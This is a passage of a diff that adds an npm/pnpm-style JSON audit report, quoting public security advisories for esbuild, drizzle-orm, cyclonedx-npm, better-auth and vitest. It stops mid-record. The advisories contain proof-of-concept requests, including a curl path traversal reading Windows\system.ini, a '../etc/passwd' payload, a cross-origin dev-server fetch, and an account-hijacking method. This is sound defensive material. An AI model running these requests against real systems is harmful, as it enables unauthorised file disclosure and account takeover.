@@ -1,0 +1,1391 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1244013,
+          "path": ".>@cyclonedx/cyclonedx-npm>libxmljs2>node-gyp>make-fetch-happen>cacache>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1244623,
+          "path": ".>@cyclonedx/cyclonedx-npm>libxmljs2>node-gyp>make-fetch-happen>cacache>glob>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "packages__db>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120680,
+          "path": "apps__web>@nuxt/ui>@nuxt/fonts>fontless>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "drizzle-orm",
+      "resolves": [
+        {
+          "id": 1116251,
+          "path": "apps__api>drizzle-orm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@cyclonedx/cyclonedx-npm",
+      "resolves": [
+        {
+          "id": 1121296,
+          "path": ".>@cyclonedx/cyclonedx-npm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1224698,
+          "path": ".>@cyclonedx/cyclonedx-npm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "better-auth",
+      "resolves": [
+        {
+          "id": 1124303,
+          "path": "apps__api>better-auth",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243435,
+          "path": "apps__api>better-auth",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243466,
+          "path": "apps__api>better-auth",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243467,
+          "path": "apps__api>better-auth",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vitest",
+      "resolves": [
+        {
+          "id": 1193683,
+          "path": ".>vitest",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@vitest/mocker",
+      "resolves": [
+        {
+          "id": 1193684,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "hono",
+      "resolves": [
+        {
+          "id": 1240640,
+          "path": "apps__api>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242595,
+          "path": "apps__api>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tinypool",
+      "resolves": [
+        {
+          "id": 1241260,
+          "path": ".>vitest>tinypool",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241261,
+          "path": ".>vitest>tinypool",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nuxt/nitro-server",
+      "resolves": [
+        {
+          "id": 1242828,
+          "path": "apps__web>nuxt>@nuxt/nitro-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nuxt",
+      "resolves": [
+        {
+          "id": 1242830,
+          "path": "apps__web>nuxt",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242831,
+          "path": "apps__web>nuxt",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242832,
+          "path": "apps__web>nuxt",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "happy-dom",
+      "resolves": [
+        {
+          "id": 1243084,
+          "path": "apps__web>happy-dom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243623,
+          "path": "apps__web>happy-dom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "deepmerge",
+      "resolves": [
+        {
+          "id": 1243505,
+          "path": "apps__web>nuxt>@nuxt/nitro-server>nitropack>@rollup/plugin-node-resolve>deepmerge",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@hono/node-server",
+      "resolves": [
+        {
+          "id": 1243661,
+          "path": "apps__api>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1244013,
+          "path": "apps__web>@vue/test-utils>js-beautify>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nuxt/vite-builder",
+      "resolves": [
+        {
+          "id": 1244029,
+          "path": "apps__web>nuxt>@nuxt/vite-builder",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1244623,
+          "path": ".>@vitest/coverage-v8>test-exclude>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "packages__db>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1116251": {
+      "findings": [
+        {
+          "version": "0.44.7",
+          "paths": [
+            "apps__api>drizzle-orm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/drizzle-team/drizzle-orm/security/advisories/GHSA-gpj5-g38j-94v9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39356\n- https://github.com/advisories/GHSA-gpj5-g38j-94v9",
+      "created": "2026-04-08T00:14:58.000Z",
+      "id": 1116251,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDrizzle ORM improperly escaped quoted SQL identifiers in its dialect-specific `escapeName()` implementations. In affected versions, embedded identifier delimiters were not escaped before the identifier was wrapped in quotes or backticks.\n\nAs a result, applications that pass attacker-controlled input to APIs that construct SQL identifiers or aliases, such as `sql.identifier()`, `.as()`, may allow an attacker to terminate the quoted identifier and inject SQL.\n\n### Affected components\n\nThe issue affects the identifier escaping logic used by the PostgreSQL, MySQL, SQLite, SingleStore, and Gel dialects.\n\n### Impact\n\nThis issue only affects applications that pass untrusted runtime input into identifier or alias construction. Common examples include dynamic sorting, dynamic report builders, and CTE or alias names derived from request parameters.\n\nDepending on the database dialect, query context, and database permissions, successful exploitation may enable blind or direct data disclosure, schema enumeration, query manipulation, privilege escalation, or destructive operations.\n\nApplications that use only static schema objects, or that strictly map user input through an allowlist of known column or alias names, are not affected.\n\n### Details\n\nIn affected versions, `escapeName()` wrapped the identifier but did not escape the quote delimiter inside the identifier value:\n\n- PostgreSQL / SQLite / Gel: `\"` was not doubled to `\"\"`\n- MySQL / SingleStore: `` ` `` was not doubled to `` `` ``\n\nBecause of this, crafted input containing the dialect-specific identifier delimiter could break out of the quoted identifier and be interpreted as SQL syntax.\n\nA representative vulnerable pattern is dynamic sorting using untrusted input:\n\n```ts\nconst sortField = req.query.sort || 'id';\n\nconst rows = await db\n  .select()\n  .from(users)\n  .orderBy(sql.identifier(sortField));",
+      "reported_by": null,
+      "title": "Drizzle ORM has SQL injection via improperly escaped SQL identifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39356"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "drizzle-orm",
+      "vulnerable_versions": "<0.45.2",
+      "github_advisory_id": "GHSA-gpj5-g38j-94v9",
+      "recommendation": "Upgrade to version 0.45.2 or later",
+      "patched_versions": ">=0.45.2",
+      "updated": "2026-04-08T00:14:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-gpj5-g38j-94v9"
+    },
+    "1120680": {
+      "findings": [
+        {
+          "version": "0.27.7",
+          "paths": [
+            "apps__web>@nuxt/ui>@nuxt/fonts>fontless>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr\n- https://github.com/evanw/esbuild/releases/tag/v0.28.1\n- https://github.com/advisories/GHSA-g7r4-m6w7-qqqr",
+      "created": "2026-06-12T20:08:53.000Z",
+      "id": 1120680,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe development server contains a path traversal vulnerability on Windows when serving files from `servedir`.\n\nDue to the use of `path.Clean()` (which only normalizes forward-slash `/` separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (`\\`) that bypass the intended directory containment logic. An attacker can escape the configured `servedir` root and access arbitrary files on the filesystem.\nThis issue affects Windows environments only.\n\n### Details\n\nThe request path is sanitized using:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\n```\n\n\nHowever:\n- `path.Clean()` is POSIX-style and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)\n- On Windows, `\\` is a valid path separator\n- `path.Clean()` does not treat `\\` as a separator\n\nLater, the server constructs the absolute path:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\nabsPath := h.fs.Join(h.servedir, queryPath)\n```\n\nIf `queryPath` contains sequences such as:\n```\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\n```\n\n`path.Clean()` will not normalize them, but the Windows filesystem will interpret `\\` as directory separators when resolving `absPath`.\nBecause the implementation does not verify that the final resolved path remains within `servedir`, it allows directory traversal outside the intended root directory.\n### Vulnerable Code\n\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\tqueryPath := path.Clean(req.URL.Path)[1:]\n\t....\n\t// Check for a file in the \"servedir\" directory\n\tif h.servedir != \"\" && kind != fs.FileEntry {\n\t\tabsPath := h.fs.Join(h.servedir, queryPath)\n\t\tif absDir := h.fs.Dir(absPath); absDir != absPath {\n\t\t\tif entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {\n\t\t\t\tif entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil && entry.Kind(h.fs) == fs.FileEntry {\n\t....\t\t\t\t\n```\n\n\n### Steps to reproduce\n\n```\nnpm install --save-exact --save-dev esbuild\n\necho \"console.log(1)\" > app.js\n\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n\n.\\node_modules\\.bin\\esbuild app.js --bundle --outdir=www --servedir=www --watch\n\ncurl -i --path-as-is \"http://localhost:8000/..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n<content of Windows\\system.ini>\n```\n\n\n### Impact\n\n- Arbitrary file read on Windows\n- Exposure of sensitive files",
+      "reported_by": null,
+      "title": "esbuild allows arbitrary file read when running the development server on Windows",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "esbuild",
+      "vulnerable_versions": ">=0.27.3 <0.28.1",
+      "github_advisory_id": "GHSA-g7r4-m6w7-qqqr",
+      "recommendation": "Upgrade to version 0.28.1 or later",
+      "patched_versions": ">=0.28.1",
+      "updated": "2026-06-12T20:08:54.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"
+    },
+    "1121296": {
+      "findings": [
+        {
+          "version": "4.2.1",
+          "paths": [
+            ".>@cyclonedx/cyclonedx-npm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/CycloneDX/cyclonedx-node-npm/security/advisories/GHSA-v75r-vx73-82pj\n- https://github.com/CycloneDX/cyclonedx-node-npm/pull/1476\n- https://github.com/CycloneDX/cyclonedx-node-npm/releases/tag/v5.0.0\n- https://github.com/advisories/GHSA-v75r-vx73-82pj",
+      "created": "2026-06-19T20:47:48.000Z",
+      "id": 1121296,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nA command injection vulnerability exists in `@cyclonedx/cyclonedx-npm` when the CLI is invoked with the `--workspace <value>` option while the environment variable `npm_execpath` is unset or empty.  \nUser???supplied `--workspace` values are passed to a subshell without proper sanitization, enabling attackers to inject arbitrary OS commands.  \nThis issue corresponds to **CWE???78**: Improper Neutralization of Special Elements used in an OS Command.\n\nThe vulnerability was fixed in version [5.0.0][v5.0.0].\n\n## Vulnerability Details\n\nWhen `cyclonedx-npm` is executed with the `--workspace` option, the provided argument is incorporated into an internal shell command.  \nIf the environment variable `npm_execpath` is set, the tool uses the npm executable directly and no injection occurs.  \nHowever, when `npm_execpath` is unset or empty, the tool falls back to spawning a subshell and interpolating the `--workspace` value directly into the command string without proper escaping or neutralization.\n\nAs a result, specially crafted workspace names can break out of the intended command context and execute arbitrary commands with the privileges of the invoking user.\n\n## Impact\n\nAn attacker who can influence the value passed to `--workspace` can execute arbitrary OS commands.  \nThis may lead to:\n\n* Arbitrary command execution\n* Data exfiltration\n* Local privilege escalation (depending on how the tool is used)\n* Modification or destruction of files accessible to the user running the CLI\n\nThe vulnerability affects only scenarios where:\n* The user invokes `cyclonedx-npm` with `--workspace <value>`, and\n* The environment variable `npm_execpath` is unset or empty\n\n## Exploitation Conditions (High???Level)\n\nExploitation requires the attacker to supply or influence the `--workspace` value passed to the CLI.  \nIf the tool falls back to its subshell execution path, specially crafted workspace identifiers can cause unintended command execution.  \nNo exploit code is included here to avoid providing weaponizable examples.\n\n## Root Cause\n\nThe CLI constructs a shell command using untrusted input from the `--workspace` option.  \nBecause the fallback code path does not sanitize or escape the workspace value, special shell metacharacters (e.g., `;`, `&&`, `|`) are interpreted by the shell, enabling command injection.\n\nThis behavior matches **CWE???78**.\n\n## Fix\n\nThe vulnerability was resolved in [PR #1476], which ensures that workspace values are handled safely and are no longer passed to a subshell in an unsafe manner.\n\nThe fix is included in `@cyclonedx/cyclonedx-npm` version [5.0.0][v5.0.0].\n\n## Remediation\n\n* Upgrade to version [5.0.0][v5.0.0] or later, which contains the complete fix.\n* As a temporary mitigation for older versions, ensure that the environment variable `npm_execpath` is set before invoking the tool.\n* Avoid passing untrusted or user???controlled values to the `--workspace` option.\n\n[v5.0.0]: https://github.com/CycloneDX/cyclonedx-node-npm/releases/tag/v5.0.0\n[PR #1476]: https://github.com/CycloneDX/cyclonedx-node-npm/pull/1476",
+      "reported_by": null,
+      "title": "@cyclonedx/cyclonedx-npm: Shell Injection via Unsanitized --workspace Argument",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-55849"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@cyclonedx/cyclonedx-npm",
+      "vulnerable_versions": ">=2.1.0 <5.0.0",
+      "github_advisory_id": "GHSA-v75r-vx73-82pj",
+      "recommendation": "Upgrade to version 5.0.0 or later",
+      "patched_versions": ">=5.0.0",
+      "updated": "2026-06-19T20:47:49.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-v75r-vx73-82pj"
+    },
+    "1124303": {
+      "findings": [
+        {
+          "version": "1.6.14",
+          "paths": [
+            "apps__api>better-auth"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/better-auth/better-auth/security/advisories/GHSA-qq9h-g4jm-xgf3\n- https://github.com/better-auth/better-auth/pull/10239\n- https://github.com/better-auth/better-auth/commit/c06a56d83a40bbaeac12d3a8b8b67e59f92a9110\n- https://github.com/better-auth/better-auth/releases/tag/v1.6.22\n- https://github.com/better-auth/better-auth/releases/tag/v1.7.0-beta.10\n- https://github.com/advisories/GHSA-qq9h-g4jm-xgf3",
+      "created": "2026-07-24T15:44:01.000Z",
+      "id": 1124303,
+      "npm_advisory_id": null,
+      "overview": "### Am I affected\n\nYou are affected if all of the following hold:\n\n- You run a `better-auth` version below 1.6.22, or a `1.7.0-beta` below `1.7.0-beta.10`.\n- You enable the magic-link plugin or the email-OTP plugin.\n- You also enable email and password sign-up with open registration.\n- An account can exist at an address before its owner first signs in with the passwordless flow.\n\n### Summary\n\nAn attacker can keep password access to a victim's account after the victim starts using it. The attack runs in three steps. First, with open registration, the attacker signs up using the victim's email and a password the attacker picks. The account stays unverified, so the attacker cannot use it yet. Later the real owner signs in with a magic link or an email OTP. That step marks the account verified, and the attacker's password now works on it.\n\n### Details\n\nWhen an account already exists for an address, magic-link verification and email-OTP sign-in both sign in to that account. They mark it verified and issue a session. Before the fix, neither one removed a password set while the account was still unverified. Neither one revoked existing sessions. So a password set before anyone proved control of the mailbox kept working after the owner proved control.\n\nThis is a pre-account-hijacking weakness. It is the same class as the OAuth advisory GHSA-g38m-r43w-p2q7, applied to the passwordless email flows. Requiring email verification does not stop it. The verification step is the exact moment that turns the planted account into a usable one.\n\nThe fix treats current proof of control over the address as authoritative. When either flow finds an account whose email was never confirmed, it now removes the password and revokes existing sessions first. Only then does it mark the account verified and issue the new session. The owner signs in as before. Only access created before the proof is removed.\n\n### Patches\n\nUpgrade to `better-auth` 1.6.22 or later on the stable line. On the 1.7 pre-release line, upgrade to `1.7.0-beta.10` or later. Earlier 1.7 betas, up to and including `1.7.0-beta.9`, still contain the bug.\n\n### Workarounds\n\nIf you cannot upgrade right away, you can lower the risk in two ways. Require email verification before you accept any password on an account. Remove unverified accounts quickly, so an address cannot sit reserved for long. Both steps shrink the opening, but they do not close it. Upgrading is the real fix.\n\n### Impact\n\nThe attacker gains lasting password access to an account the victim depends on, alongside the victim. From there the attacker can read and change the victim's data. The attacker can also reset the credentials and lock the victim out. The takeover only completes when the victim signs in through the passwordless flow. It also needs a setup that pairs that flow with open email and password sign-up.\n\n### Credit\n\nReported by the Vercel security team.",
+      "reported_by": null,
+      "title": "Better Auth: Account takeover via pre-account hijacking on magic-link and email-OTP sign-in",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "better-auth",
+      "vulnerable_versions": ">=1.1.3 <1.6.22",
+      "github_advisory_id": "GHSA-qq9h-g4jm-xgf3",
+      "recommendation": "Upgrade to version 1.6.22 or later",
+      "patched_versions": ">=1.6.22",
+      "updated": "2026-07-24T15:44:02.000Z",
+      "cvss": {
+        "score": 8.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-287",
+        "CWE-345"
+      ],
+      "url": "https://github.com/advisories/GHSA-qq9h-g4jm-xgf3"
+    },
+    "1193683": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ".>vitest"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193683,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', ???)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../???/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vitest",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1193684": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ".>vitest>@vitest/mocker"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193684,
+      "npm_advisory_id": null,
